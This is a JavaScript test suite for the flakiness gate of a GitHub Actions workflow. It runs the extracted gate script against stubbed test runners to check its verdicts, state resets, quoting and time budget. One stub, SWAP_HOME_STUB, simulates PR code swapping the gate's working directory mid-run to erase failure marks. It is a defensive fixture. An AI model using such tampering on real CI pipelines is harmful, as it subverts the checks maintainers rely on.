    // agent 120m + install/build 15m + gate ~40m (the 15m round budget is
    // checked BEFORE each reset, so the last invocation drags its reset
    // plus its -k 30 600 cap; add the OID pin and the post-gate reset)
    // + misc ~5m ≈ 180m — the job limit must stay comfortably above the
    // sum or the container is killed mid-run and the ship-what-ran path
    // is bypassed (see the budget comment).
    assert.ok(
      verifyJob['timeout-minutes'] >= 190,
      `timeout-minutes must cover the gate budget (got ${verifyJob['timeout-minutes']})`,
    );
  });
});

describe('qwen-triage: flakiness gate — behavioral, under the production wrapper', () => {
  // The structural tests above pin the YAML text; these execute the
  // extracted gate and publisher fragments, because YAML inspection cannot
  // observe the runner's own shell contract: every run: block executes
  // under `bash --noprofile --norc -e -o pipefail`, and a `set -uo` script
  // does NOT clear that inherited -e. That exact blind spot shipped the
  // round-1 blocker — the first failing test invocation killed the step —
  // so every scenario here runs under the wrapper, not under a bare bash.
  const flakeStep = verifyJob.steps.find((s) => s.id === 'flake');
  const flakeRunVerbatim = flakeStep.run;
  // The gate's home is a hard-coded container-root constant on purpose: an
  // env-overridable home would be a PR-reachable channel ($GITHUB_ENV is
  // uid-1000 writable and the record step rm -rf's whatever the home names).
  // The harness therefore relocates that one constant into its scratch tree
  // — a fixture substitution, not a production knob. The structural suite
  // pins the production value separately.
  const PROD_GATE_HOME = '/flake-gate';
  assert.ok(
    flakeRunVerbatim.includes(`GATE_DIR=${PROD_GATE_HOME}`),
    'the gate must define its home as the container-root constant',
  );
  const publishRun = doc.jobs['publish-verify'].steps.find(
    (s) => s.name === 'Post verification report comment',
  ).run;

  const STUB_RUNUSER = [
    '#!/bin/bash',
    'while [ "$1" != "--" ]; do shift; done',
    'shift',
    'exec "$@"',
    '',
  ].join('\n');
  // npx/node stub: the last argument is the ./file operand; its scripted
  // outcome sequence lives at $FLAKE_SEQ_DIR/<basename>, consumed one
  // letter per invocation and cycled (missing sequence file = always
  // pass). Letters: P=exit 0, F=exit 1, T=exit 124 (timeout), K=exit 137
  // (signal kill), M=exit 127 (runner binary missing), N=exit 1 printing
  // the no-collection marker — T/K/M model infrastructure exits and N a
  // runner include-set rejection; none are test failures.
  const STUB_TESTRUNNER = [
    '#!/bin/bash',
    // Round-5 guards baked into EVERY default-runner scenario: PR test code
    // must never see the runner-injection files (env -u strip), and the
    // operand must resolve from the invocation cwd (pins the `cd` into the
    // owning package and the %q quoting for every arm).
    'for v in GITHUB_OUTPUT GITHUB_STATE GITHUB_ENV GITHUB_PATH GITHUB_STEP_SUMMARY; do',
    '  [ -z "${!v:-}" ] || { echo "runner-injection env leaked: $v"; exit 97; }',
    'done',
    'f="${@: -1}"',
    '[ -f "$f" ] || { echo "operand not resolvable from $PWD: $f"; exit 96; }',
    // Round 6: the child-env handoff (CI parity, heap cap, per-invocation
    // TMPDIR under RUNNER_TEMP) is enforced behaviorally by every
    // default-runner scenario, not just by a textual pin.
    '[ "${CI:-}" = true ] || { echo "CI parity lost"; exit 95; }',
    'case "${NODE_OPTIONS:-}" in *max-old-space-size*) ;; *) echo "heap cap lost"; exit 95 ;; esac',
    'case "${TMPDIR:-}" in "$RUNNER_TEMP"/*) ;; *) echo "shared TMPDIR"; exit 95 ;; esac',
    'key="$(basename "$f")"',
    'n_file="$FLAKE_SEQ_DIR/.count-$key"',
    'n=$(cat "$n_file" 2>/dev/null || echo 0)',
    'echo $((n+1)) > "$n_file"',
    'seq="$(cat "$FLAKE_SEQ_DIR/$key" 2>/dev/null || echo P)"',
    'i=$((n % ${#seq}))',
    'm="${seq:$i:1}"',
    '[ "$m" = P ] && exit 0',
    '[ "$m" = T ] && exit 124',
    '[ "$m" = K ] && exit 137',
    '[ "$m" = M ] && exit 127',
    '[ "$m" = N ] && { echo "No test files found, exiting with code 1"; exit 1; }',
    'echo "stub failure for $key run $((n+1))"',
    'exit 1',
    '',
  ].join('\n');
  // GNU coreutils `timeout` exists on the Linux runner but not on stock
  // macOS: without a stub every invocation exits 127 off-Linux and every
  // scenario reads consistent-fail. Consume the gate's `-k 30 600` shape
  // and exec the wrapped command.
  const STUB_TIMEOUT = [
    '#!/bin/bash',
    'while [ $# -gt 0 ]; do',
    '  case "$1" in',
    '    -k|--kill-after) shift 2 ;;',
    '    *) break ;;',
    '  esac',
    'done',
    'shift',
    'exec "$@"',
    '',
  ].join('\n');
  // pkill/ps are stubbed for the harness's sake, not the gate's: the real
  // pkill would kill processes owned by whoever runs these tests, and a
  // real `ps -u node` on a box with a live node user would spin the
  // reset's wait loop.
  const STUB_PKILL = ['#!/bin/bash', 'exit 0', ''].join('\n');
  const STUB_PS = ['#!/bin/bash', 'exit 0', ''].join('\n');
  // R14-3 model: the invocation's runner binary is a detached survivor —
  // while the sample runs it swaps the gate home's ENTRY in the
  // uid-1000-writable $RUNNER_TEMP (rename needs write on the parent
  // only), then fails the sample. The redirect fd was opened against the
  // genuine home; every path-based read the mark cascade does afterwards
  // must be re-validated first.
  const SWAP_HOME_STUB = [
    '#!/bin/bash',
    'if [ ! -e "$RUNNER_TEMP/.flake-home-swapped" ]; then',
    '  touch "$RUNNER_TEMP/.flake-home-swapped"',
    '  mv "$RUNNER_TEMP/flake-gate" "$RUNNER_TEMP/flake-gate-stash"',
    '  mkdir "$RUNNER_TEMP/flake-gate"',
    '  chmod 700 "$RUNNER_TEMP/flake-gate"',
    'fi',
    'echo "stub test failure (home-swap scenario)"',
    'exit 1',
    '',
  ].join('\n');

  const scenarioRoot = mkdtempSync(join(tmpdir(), 'flake-behavioral-'));
  after(() => {
    // STUB_POISON leaves a mode-500 directory rmSync cannot delete
    // (force suppresses ENOENT only, not EACCES), which marks the whole
    // suite hookFailed and leaks the tree; restore owner permissions
    // first.
    spawnSync('chmod', ['-R', 'u+rwx', scenarioRoot]);
    rmSync(scenarioRoot, { recursive: true, force: true });
  });

  const runGate = ({
    layout = {},
    list,
    sequences = {},
    stubs = {},
    env: envOverrides = {},
    git = true,
    mutate,
    gateHomeMode = 0o700,
  }) => {
    const root = mkdtempSync(join(scenarioRoot, 'case-'));
    const ws = join(root, 'ws');
    const rt = join(root, 'rt');
    const bin = join(root, 'bin');
    const seqDir = join(root, 'seq');
    for (const d of [ws, rt, bin, seqDir]) mkdirSync(d, { recursive: true });
    for (const [p, content] of Object.entries(layout)) {
      mkdirSync(dirname(join(ws, p)), { recursive: true });
      writeFileSync(join(ws, p), content);
    }
    // The gate's working home: 0700 and owned by whoever runs the suite —
    // the same integrity premise the workflow asserts with -O (root in
    // production). Scenarios that need to defeat it override the mode.
    const gateDir = join(rt, 'flake-gate');
    mkdirSync(gateDir, { recursive: true });
    chmodSync(gateDir, gateHomeMode);
    if (list !== null) {
      // Scenarios describe lists as newline text; the wire format is
      // NUL-delimited (the record step emits `git diff -z` through
      // `grep -z`), so convert here.
      const framed = list
        .split('\n')
        .filter(Boolean)
        .map((f) => `${f}\u0000`)
        .join('');
      writeFileSync(join(gateDir, 'files'), framed);
    }
    for (const [k, v] of Object.entries(sequences)) {
      writeFileSync(join(seqDir, k), v);
    }
    // An ambient GIT_DIR redirects init/add/commit at the AMBIENT
    // repository (and clobbers its index) while ws gets no .git — scrub
    // the GIT_* keys the way the gate strips them from its own git
    // calls.
    const fixtureGitEnv = Object.fromEntries(
      Object.entries(process.env).filter(([k]) => !k.startsWith('GIT_')),
    );
    if (git) {
      // Default on: production always samples a checkout, the gate's
      // per-invocation `git reset --hard` reset needs a committed tree
      // to restore, and a reset that fails on a missing repo would fail
      // the gate open to `error`.
      for (const args of [
        ['init', '-q'],
        ['add', '-A'],
        [
          '-c',
          'user.name=flake-gate',
          '-c',
          'user.email=flake@gate',
          'commit',
          '-qm',
          'fixture',
        ],
      ]) {
        const g = spawnSync('git', args, {
          cwd: ws,
          encoding: 'utf8',
          env: fixtureGitEnv,
        });
        assert.equal(g.status, 0, `git ${args.join(' ')}: ${g.stderr}`);
      }
    }
    // Applied AFTER the commit: models PR lifecycle scripts (npm ci/build)
    // mutating the tree between list-record and round 1.
    if (mutate) mutate(ws);
    const stubSet = {
      runuser: STUB_RUNUSER,
      npx: STUB_TESTRUNNER,
      node: STUB_TESTRUNNER,
      timeout: STUB_TIMEOUT,
      pkill: STUB_PKILL,
      ps: STUB_PS,
      ...stubs,
    };
    for (const [name, content] of Object.entries(stubSet)) {
      writeFileSync(join(bin, name), content);
      chmodSync(join(bin, name), 0o755);
    }
    const gateFile = join(root, 'gate.sh');
    writeFileSync(
      gateFile,
      flakeRunVerbatim.replaceAll(
        `GATE_DIR=${PROD_GATE_HOME}`,
        `GATE_DIR=${gateDir}`,
      ),
    );
    const out = join(rt, 'github-output');
    writeFileSync(out, '');
    writeFileSync(join(rt, 'github-summary'), '');
    const env = {
      ...process.env,
      // The runner assembles the step's env: block around run:, which this
      // harness used to skip — that dropped the POSIXLY_CORRECT startup
      // defence out of every behavioral scenario. Apply its literal
      // values (expression entries stay out — the harness owns those);
      // harness keys win on collisions, scenarios can still override.
      ...Object.fromEntries(
        Object.entries(flakeStep.env).filter(
          ([, v]) => typeof v === 'string' && !v.includes('${{'),
        ),
      ),
      // Hermetic PATH: the gate's env -i re-exec scrubs the environment
      // while the (non-root) harness skips the EUID-gated PATH pin, so
      // any env-dependent git wrapper in the ambient PATH (e.g. a shim
      // exec'ing a variable the scrub drops) breaks every git-backed
      // scenario with misleading `error` verdicts.
      PATH: `${bin}:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`,
      RUNNER_TEMP: rt,
      GITHUB_OUTPUT: out,
      GITHUB_STEP_SUMMARY: join(rt, 'github-summary'),
      FLAKE_ROUNDS: '5',
      FLAKE_SEQ_DIR: seqDir,
      ...envOverrides,
    };
    for (const [k, v] of Object.entries(env)) {
      // An override of undefined deletes the variable (unset scenarios).
      if (v === undefined) delete env[k];
    }
    const res = spawnSync(
      'bash',
      ['--noprofile', '--norc', '-e', '-o', 'pipefail', gateFile],
      {
        cwd: ws,
        env,
        encoding: 'utf8',
        timeout: 60_000,
      },
    );
    const outputs = Object.fromEntries(
      readFileSync(out, 'utf8')
        .split('\n')
        .filter((l) => l.includes('='))
        .map((l) => [l.slice(0, l.indexOf('=')), l.slice(l.indexOf('=') + 1)]),
    );
    let log = '';
    try {
      log = readFileSync(join(gateDir, 'log'), 'utf8');
    } catch {
      // a scenario may legitimately abort before creating the log
    }
    let summary = '';
    try {
      summary = readFileSync(join(rt, 'github-summary'), 'utf8');
    } catch {
      // ditto
    }
    // Ground-truth invocation count per operand basename, read from the
    // stub's own counter files — log-line absence alone cannot prove an
    // invocation never ran.
    const counts = (key) => {
      try {
        return Number(
          readFileSync(join(seqDir, `.count-${key}`), 'utf8').trim(),
        );
      } catch {
        return 0;
      }
    };
    return { res, outputs, log, summary, counts };
  };

  const UNIT = {
    'scripts/tests/a.test.js': '',
    'scripts/tests/b.test.js': '',
  };

  it('all-pass rounds land as `pass` with exit 0', () => {
    const { res, outputs, summary } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\nscripts/tests/b.test.js\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
    // Exact counters (round 5), not just the verdict word — and the step
    // summary line finish() owes the run must actually be written.
    assert.equal(
      outputs.flake_summary,
      '2 changed test file(s) x 5 identical rounds, no divergence',
    );
    assert.match(summary, /Flakiness gate: pass — 2 changed test file\(s\)/);
  });

  it('per-file P/F alternation is `flaky` even next to a consistently failing file, and the wrapper -e does not kill the step', () => {
    // One shared exit bit would classify this pair consistent-fail (the
    // FFFFF file masks the PFPFP one); per-file groups must still see the
    // divergence. Every F also exercises the errexit hazard: without
    // `set +e` the first one kills the script under the wrapper.
    const { res, outputs, log } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\nscripts/tests/b.test.js\n',
      sequences: { 'a.test.js': 'F', 'b.test.js': 'PF' },
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'flaky');
    assert.match(log, /a\.test\.js: FFFFF/);
    assert.match(log, /b\.test\.js: PFPFP/);
    // The publisher embeds only the FIRST 10,000 chars: the matrix and
    // verdict must precede the failure tails or the demotion's promised
    // evidence is truncated away in exactly the flaky runs it points at.
    const matrixAt = log.indexOf('per-file results');
    const verdictAt = log.indexOf('\nverdict: flaky');
    const detailAt = log.indexOf('--- per-invocation detail');
    assert.ok(
      matrixAt !== -1 && verdictAt !== -1 && detailAt !== -1,
      'log must carry matrix, verdict, and detail sections',
    );
    assert.ok(
      matrixAt < verdictAt && verdictAt < detailAt,
      'matrix and verdict must precede the failure detail',
    );
    // And the failure tails themselves — the content that can outgrow the
    // embed cap — must all sit behind the verdict, not just the marker.
    const firstTail = log.indexOf('--- output tail');
    assert.ok(
      firstTail !== -1 && firstTail > verdictAt,
      'failure tails must never precede the matrix/verdict',
    );
    // Gate outputs are embedded UNESCAPED into the published comment: they
    // must stay fixed text plus counters, never PR-controlled strings.
    assert.match(
      outputs.flake_summary,
      /^\d+ of \d+ changed test file\(s\) returned different results across identical re-runs \(\d+ full round\(s\)\)$/,
      'the summary must be fixed text plus counters',
    );
    assert.doesNotMatch(
      outputs.flake_summary,
      /a\.test\.js|b\.test\.js/,
      'PR-controlled filenames must stay out of the outputs',
    );
  });

  it('identical failure every round stays informational `consistent-fail`, exit 0', () => {
    const { res, outputs } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\n',
      sequences: { 'a.test.js': 'F' },
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'consistent-fail');
    assert.equal(
      outputs.flake_summary,
      '1 of 1 changed test file(s) failed identically in every round — deterministic, so CI owns that signal',
    );
  });

  it('timeout/signal exits are infrastructure, never F marks or fake flakiness', () => {
    // A pass next to an exit-124 round used to publish `flaky`; an OOM
    // kill (137) is the same class. Infra exits must stay out of P/F
    // divergence and land the informational `timeout` verdict instead.
    const { res, outputs, log } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\nscripts/tests/b.test.js\n',
      sequences: { 'a.test.js': 'PT', 'b.test.js': 'K' },
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'timeout');
    assert.match(log, /a\.test\.js: PIPIP/);
    assert.match(log, /b\.test\.js: IIIII/);
    assert.match(log, /exit 124/);
    assert.doesNotMatch(outputs.flake_summary, /a\.test\.js|b\.test\.js/);
  });

  it('exit 125-127 are timeout failure modes, never F marks or fake flakiness', () => {
    // 124 is the cap and 128+N a signal kill, but 125-127 are timeout's
    // OWN failure modes (it failed, or the runner binary was
    // unrunnable/missing) — recorded as F they published a fake `flaky`
    // next to any pass (round-7 Critical probe: exit 127 → FPPPP read as
    // flaky).
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/a.test.js': '' },
      list: 'scripts/tests/a.test.js\n',
      sequences: { 'a.test.js': 'MPPPP' },
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'timeout');
    assert.match(log, /a\.test\.js: IPPPP/);
    assert.match(log, /exit 127/);
    assert.doesNotMatch(outputs.flake_summary, /a\.test\.js/);
  });

  it('a collection-state transition (N next to P or F) is divergence', () => {
    // An identical tree that COLLECTS a file in some rounds and rejects
    // it in others is itself non-determinism; collapsing NPNPN to `pass`
    // published a verdict about samples that never all executed (round-7
    // Critical). Faking N can only add demotions a PR earns — one-way
    // authority holds.
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/a.test.js': '' },
      list: 'scripts/tests/a.test.js\n',
      sequences: { 'a.test.js': 'NPNPN' },
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'flaky');
    assert.match(log, /a\.test\.js: NPNPN/);
  });

  it('an N↔F transition is divergence too — the *N*F*|*F*N* arm is behaviorally pinned', () => {
    // R14-4: the divergence arm's `*N*F*|*F*N*` half had no behavioral
    // fixture — deleting it kept every suite green (mutant run) while a
    // file alternating between a real failure and a collection refusal
    // (e.g. a flaky test intermittently crashing the runner's own
    // collection) silently lost its earned flaky demotion.
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/a.test.js': '' },
      list: 'scripts/tests/a.test.js\n',
      sequences: { 'a.test.js': 'NF' },
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'flaky');
    assert.match(log, /a\.test\.js: NFNFN/);
  });

  it('a home swapped mid-invocation is detected after the subshell returns — the mark comes from the exit status, never from swapped bytes', () => {
    // R14-3: the cascade after `status=$?` read $out path-based with no
    // intact re-check — a survivor swapping the home's entry during the
    // invocation erased recorded F marks into I (the redirect fd opened
    // against the genuine home, but `[ ! -e "$out" ]` re-resolved
    // through the swapped entry), dodging the very demotion the gate
    // exists to apply. Honest bound: a compromised home stops sampling —
    // the mark comes from the exit status alone and the detection is
    // visible; preserving the demotion itself would price a mid-run
    // swap as demoting evidence, which stays a design call.
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/a.test.js': '' },
      list: 'scripts/tests/a.test.js\n',
      sequences: { 'a.test.js': 'F' },
      stubs: { npx: SWAP_HOME_STUB, node: SWAP_HOME_STUB },
    });
    assert.equal(res.status, 0, res.stderr);
    // Sub-2-round stop: one honest sample cannot separate a flake from
    // a deterministic outcome — the verdict stays informational, but
    // the mark must be the honest F, never the erased I.
    assert.equal(outputs.flake_verdict, 'timeout');
    assert.match(log, /^\s*scripts\/tests\/a\.test\.js: F$/m);
    assert.doesNotMatch(log, /^\s*scripts\/tests\/a\.test\.js: I$/m);
  });

  it('real divergence still outranks an infra exit in another file', () => {
    const { res, outputs } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\nscripts/tests/b.test.js\n',
      sequences: { 'a.test.js': 'PF', 'b.test.js': 'PT' },
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'flaky');
  });

  it('round-state reset keeps a tree-mutating deterministic test from faking flakiness', () => {
    // The stub passes only while fixture.txt is pristine, then mutates it.
    // Without the gate's between-round `git checkout -- .` reset, rounds
    // 2-5 fail on round 1's residue (PFFFF -> false flaky); with it every
    // round starts from the committed state again (PPPPP -> pass).
    const STUB_STATEFUL = [
      '#!/bin/bash',
      'if ! grep -q pristine fixture.txt; then',
      '  echo "fixture mutated by an earlier round"',
      '  exit 1',
      'fi',
      'echo mutated > fixture.txt',
      'exit 0',
      '',
    ].join('\n');
    const { res, outputs, log } = runGate({
      layout: {
        'scripts/tests/stateful.test.js': '',
        'fixture.txt': 'pristine\n',
      },
      list: 'scripts/tests/stateful.test.js\n',
      stubs: { npx: STUB_STATEFUL },
      git: true,
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(log, /stateful\.test\.js: PPPPP/);
  });

  it('untracked residue from round 1 is cleaned, not left to fail later rounds', () => {
    // `git checkout -- .` never removes untracked files (round-4 Critical
    // mechanism a): a test whose first invocation leaves an untracked
    // lock/output dir would fail rounds 2-5 on that residue (PFFFF ->
    // false flaky) unless the reset also runs `git clean -fd`.
    const STUB_UNTRACKED = [
      '#!/bin/bash',
      'if [ -e out-residue ]; then',
      '  echo "untracked residue from an earlier round"',
      '  exit 1',
      'fi',
      'mkdir out-residue',
      'exit 0',
      '',
    ].join('\n');
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/untracked.test.js': '' },
      list: 'scripts/tests/untracked.test.js\n',
      stubs: { npx: STUB_UNTRACKED },
      git: true,
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(log, /untracked\.test\.js: PPPPP/);
  });

  it('every sample starts from equivalent state: per-file reset, isolated HOME, restore from the pinned commit', () => {
    // Round-7 Critical probe: a between-rounds reset left file b sampling
    // what file a left THIS round — untracked residue, a nested fixture
    // repo (plain `git clean -fd` refuses dirs holding a nested .git), a
    // staged tracked mutation (`checkout -- .` restores from the index,
    // preserving it), and $HOME state shared by every invocation. Each
    // class alone turned a deterministic pair into b: FFFFF.
    const homeDir = mkdtempSync(join(scenarioRoot, 'home-'));
    const STUB_CROSSFILE = [
      '#!/bin/bash',
      'f="${@: -1}"',
      'case "$f" in',
      '  ./scripts/tests/a.test.js)',
      '    mkdir -p residue-dir',
      '    git init -q nested-repo',
      '    mkdir -p "$HOME/.cache"',
      '    touch "$HOME/.cache/marker"',
      '    echo dirt >> scripts/tests/b.test.js',
      '    git add scripts/tests/b.test.js',
      '    exit 0',
      '    ;;',
      '  ./scripts/tests/b.test.js)',
      '    if [ -e residue-dir ] || [ -e nested-repo ] || [ -e "$HOME/.cache/marker" ] || grep -q dirt scripts/tests/b.test.js; then',
      '      echo "sampled state an earlier sample left behind"',
      '      exit 1',
      '    fi',
      '    exit 0',
      '    ;;',
      'esac',
      'echo "unexpected operand: $f"',
      'exit 1',
      '',
    ].join('\n');
    const { res, outputs, log } = runGate({
      layout: {
        'scripts/tests/a.test.js': '',
        'scripts/tests/b.test.js': 'pristine-b\n',
      },
      list: 'scripts/tests/a.test.js\nscripts/tests/b.test.js\n',
      stubs: { npx: STUB_CROSSFILE },
      env: { HOME: homeDir },
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(log, /a\.test\.js: PPPPP/);
    assert.match(log, /b\.test\.js: PPPPP/);
  });

  it('a pre-gate tree mutation cannot make round 1 sample different content than rounds 2..N', () => {
    // Round-4 Critical mechanism c: PR lifecycle scripts run as node
    // between list-record and round 1. Without a reset BEFORE round 1 the
    // first sample sees the mutated tree and later samples see the
    // restored one — the difference reads as divergence (F then PPPP).
    const STUB_MARKER = [
      '#!/bin/bash',
      'if grep -q clean marker.txt; then exit 0; fi',
      'echo "sampled the lifecycle-mutated tree"',
      'exit 1',
      '',
    ].join('\n');
    const { res, outputs, log } = runGate({
      layout: {
        'scripts/tests/marker.test.js': '',
        'marker.txt': 'clean\n',
      },
      list: 'scripts/tests/marker.test.js\n',
      stubs: { npx: STUB_MARKER },
      git: true,
      mutate: (ws) => writeFileSync(join(ws, 'marker.txt'), 'dirty\n'),
    });
    assert.equal(res.status, 0, `gate died under the wrapper: ${res.stderr}`);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(log, /marker\.test\.js: PPPPP/);
  });

  // Scripted clock shared by the wall-budget scenarios: one value per
  // `date +%s` call, last value repeating.
  const STUB_DATE = [
    '#!/bin/bash',
    'n_file="$FLAKE_SEQ_DIR/.count-date"',
    'n=$(cat "$n_file" 2>/dev/null || echo 0)',
    'echo $((n+1)) > "$n_file"',
    'mapfile -t vals < "$FLAKE_SEQ_DIR/dates"',
    'i=$n',
    '[ "$i" -ge "${#vals[@]}" ] && i=$((${#vals[@]} - 1))',
    'echo "${vals[$i]}"',
    '',
  ].join('\n');

  it('wall-budget expiry before two full rounds is the informational timeout verdict', () => {
    // Deadline init at 0 (so the budget ends at 900), round 1 checked at
    // 100 and run, round 2 checked at 1000 — expired, one full round done.
    const one = runGate({
      layout: { 'scripts/tests/a.test.js': '' },
      list: 'scripts/tests/a.test.js\n',
      stubs: { date: STUB_DATE },
      sequences: { dates: '0\n100\n1000\n' },
    });
    assert.equal(one.res.status, 0, one.res.stderr);
    assert.equal(one.outputs.flake_verdict, 'timeout');
    assert.match(one.outputs.flake_summary, /before two full rounds/);
    // With two agreeing rounds completed before expiry, the summary must
    // say the completed rounds agreed — rounds_done must track completed
    // rounds, not the loop counter.
    const two = runGate({
      layout: { 'scripts/tests/a.test.js': '' },
      list: 'scripts/tests/a.test.js\n',
      stubs: { date: STUB_DATE },
      sequences: { dates: '0\n100\n200\n1000\n' },
    });
    assert.equal(two.res.status, 0, two.res.stderr);
    assert.equal(two.outputs.flake_verdict, 'timeout');
    assert.match(two.outputs.flake_summary, /the completed rounds agreed/);
  });

  it('a space-bearing filename survives the %q quoting as one operand', () => {
    // The operands are re-parsed by `bash -c`: without `printf %q` a space
    // splits the path into two operands, vitest finds no file, and every
    // round fails identically — a bogus consistent-fail without one
    // sample. (Round-4 R2-P3.)
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/has space.test.js': '' },
      list: 'scripts/tests/has space.test.js\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(
      log,
      /has\\ space\.test\.js/,
      'the logged command must carry the escaped, single operand',
    );
  });

  it('hostile filenames survive the generic-package and node --test arms too', () => {
    // Round 5: tame names quote to byte-identical output, so a per-arm
    // weakening of %q was invisible while only scripts/tests carried the
    // hostile fixtures. The stub's operand-resolution guard makes a
    // word-split fail loudly in any arm.
    const { res, outputs, log } = runGate({
      layout: {
        'packages/pkga/package.json': '{}',
        'packages/pkga/vitest.config.ts': '',
        'packages/pkga/src/has space.test.ts': '',
        '.github/scripts/al so.test.mjs': '',
      },
      list: 'packages/pkga/src/has space.test.ts\n.github/scripts/al so.test.mjs\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
    assert.match(
      log,
      /\(cd packages\/pkga\) npx --no-install vitest run \.\/src\/has\\ space\.test\.ts/,
      'the generic arm must quote its operand',
    );
    assert.match(
      log,
      /node --test \.\/\.github\/scripts\/al\\ so\.test\.mjs/,
      'the node --test arm must quote its operand',
    );
  });

  it('a mid-round wall-budget expiry stops the remaining files of that round', () => {
    // Two files, clock 0/100/1000: file a is checked at 100 and runs, file
    // b is checked at 1000 — the deadline gates every INVOCATION, not just
    // round boundaries. Hoisting the check to the round loop would run
    // every remaining file after expiry (up to N×10 min via the caps),
    // blowing the ~25-minute budget the job timeout accounting relies on.
    const { res, outputs, log, counts } = runGate({
      layout: UNIT,
      list: 'scripts/tests/a.test.js\nscripts/tests/b.test.js\n',
      stubs: { date: STUB_DATE },
      sequences: { dates: '0\n100\n1000\n' },
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'timeout');
    assert.match(outputs.flake_summary, /before two full rounds/);
    assert.ok(
      !log.includes('round 1 · scripts/tests/b.test.js'),
      'the second file must never be logged after the budget expired',
    );
    // Ground truth, not log absence (round 6): the stub's own counter
    // proves the invocation was never made.
    assert.equal(counts('a.test.js'), 1, 'file a ran exactly once');
    assert.equal(counts('b.test.js'), 0, 'file b never ran');
  });

  it('an observed divergence outranks a later wall-budget expiry', () => {
    // Divergence needs no full round count: once PF exists the verdict is
    // flaky even when the clock then expires — the flaky check must stay
    // ahead of the timeout branches.
    const { res, outputs } = runGate({
      layout: { 'scripts/tests/a.test.js': '' },
      list: 'scripts/tests/a.test.js\n',
      stubs: { date: STUB_DATE },
      sequences: { 'a.test.js': 'PF', dates: '0\n100\n200\n1000\n' },
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'flaky');
  });

  it('an infra exit between a P and an F does not mask the divergence', () => {
    // Marks P,I,F,P,I from a cycled PTF sequence: the I letters are
    // neutral — the P..F subsequence is still non-determinism.
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/a.test.js': '' },
      list: 'scripts/tests/a.test.js\n',
      sequences: { 'a.test.js': 'PTF' },
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'flaky');
    assert.match(log, /a\.test\.js: PIFPI/);
  });

  it('zero-collection is reported as not-collected, never as consistent-fail', () => {
    // A file the runner's include set rejects exits 1 every round with
    // "No test files found" — publishing that as "deterministic, CI owns
    // it" would be false on both clauses (round 5). All-uncollected lands
    // n/a; a mixed run passes with the not-collected count in the summary.
    const STUB_UNCOLLECTED = [
      '#!/bin/bash',
      'echo "No test files found, exiting with code 1"',
      'exit 1',
      '',
    ].join('\n');
    const alone = runGate({
      layout: { 'scripts/tests/a.test.js': '' },
      list: 'scripts/tests/a.test.js\n',
      stubs: { npx: STUB_UNCOLLECTED },
    });
    assert.equal(alone.res.status, 0, alone.res.stderr);
    assert.equal(alone.outputs.flake_verdict, 'n/a');
    assert.match(
      alone.outputs.flake_summary,
      /none of the 1 changed test file\(s\) were collected/,
    );
    assert.match(alone.log, /a\.test\.js: NNNNN/);
    const mixed = runGate({
      layout: {
        'scripts/tests/a.test.js': '',
        '.github/scripts/ok.test.mjs': '',
      },
      list: 'scripts/tests/a.test.js\n.github/scripts/ok.test.mjs\n',
      stubs: { npx: STUB_UNCOLLECTED },
    });
    assert.equal(mixed.res.status, 0, mixed.res.stderr);
    assert.equal(mixed.outputs.flake_verdict, 'pass');
    assert.match(
      mixed.outputs.flake_summary,
      /\(1 not collected by the runner — see the log\)$/,
    );
  });

  it('the docs-site tree is skipped despite its vitest.config', () => {
    const { res, outputs, log, counts } = runGate({
      layout: {
        'docs-site/package.json': '{}',
        'docs-site/vitest.config.js': '',
        'docs-site/b.test.ts': '',
      },
      list: 'docs-site/b.test.ts\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'n/a');
    assert.match(
      log,
      /outside the npm-workspace install set \(unsupported runner family\), skipped: docs-site\/b\.test\.ts/,
    );
    assert.equal(counts('b.test.ts'), 0, 'no invocation may be attempted');
  });

  it('a recorded file missing at gate time is skip-logged, never marked F', () => {
    // Round 6: the record list is pinned pre-build, but PR lifecycle
    // scripts can delete/rename a recorded file before the gate runs.
    // Without the absent-file guard the ghost would reach a runnable arm
    // and publish consistent-fail about a test that never executed.
    const { res, outputs, log } = runGate({
      layout: { 'scripts/tests/a.test.js': '' },
      list: 'scripts/tests/a.test.js\nscripts/tests/ghost.test.js\n',
    });
    assert.equal(res.status, 0, res.stderr);
    assert.equal(outputs.flake_verdict, 'pass');
